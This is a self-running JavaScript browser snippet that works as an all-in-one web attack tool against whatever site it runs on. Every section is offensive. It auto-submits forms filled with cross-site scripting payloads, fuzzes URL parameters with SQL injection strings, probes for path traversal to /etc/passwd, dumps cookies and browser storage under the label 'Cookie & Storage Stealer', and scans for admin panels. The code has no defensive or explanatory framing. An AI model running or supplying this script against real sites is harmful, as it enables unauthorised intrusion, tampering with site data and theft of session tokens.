(function() {
  const log = (msg) => console.log('[SHX]', msg);

  // 1. DOM Crawler
  const crawl = () => {
    const links = [...document.querySelectorAll('a')].map(a => a.href);
    log(`Crawled ${links.length} links`);
  };

  // 2. XSS Auto Injector
  const xss_payloads = [`"><img src=x onerror=alert('xss')>`, `'><svg/onload=alert(1)>`];
  const xss_inject = () => {
    const forms = document.forms;
    for (let form of forms) {
      for (let payload of xss_payloads) {
        for (let i = 0; i < form.elements.length; i++) {
          form.elements[i].value = payload;
        }
        form.submit();
        log(`Injected XSS payload: ${payload}`);
      }
    }
  };

  // 3. SQLi Quick Fuzz
  const sqli_payloads = [`' OR '1'='1`, `' UNION SELECT null--`, `" OR 1=1#`];
  const sqli_fuzz = () => {
    const params = location.search.slice(1).split("&");
    for (let p of sqli_payloads) {
      for (let param of params) {
        let test = location.pathname + "?" + param.split("=")[0] + "=" + encodeURIComponent(p);
        fetch(test).then(r => {
          if (r.status === 200) log(`Possible SQLi on: ${test}`);
        });
      }
    }
  };

  // 4. LFI Tester
  const lfi_paths = [`../../../../etc/passwd`, `../../../../boot.ini`];
  const lfi_test = () => {
    for (let path of lfi_paths) {
      let test = `${location.origin}${location.pathname}?file=${encodeURIComponent(path)}`;
      fetch(test).then(r => r.text()).then(t => {
        if (t.includes("root:x") || t.includes("[boot loader]")) {
          log(`💥 LFI Confirmed: ${test}`);
        }
      });
    }
  };

  // 5. Cookie & Storage Stealer
  const steal = () => {
    log(`Cookies: ${document.cookie}`);
    log(`LocalStorage: ${JSON.stringify(localStorage)}`);
    log(`SessionStorage: ${JSON.stringify(sessionStorage)}`);
  };

  // 6. Admin Panel Finder
  const find_admin = () => {
    const paths = ["/admin", "/cpanel", "/admin/login", "/dashboard", "/panel"];
    for (let path of paths) {
      fetch(path).then(r => {
        if (r.status === 200) log(`Admin page found: ${path}`);
      });
    }
  };

  // 🔥 AUTO EXEC
  crawl();
  xss_inject();
  sqli_fuzz();
  lfi_test();
  steal();
  find_admin();
})();
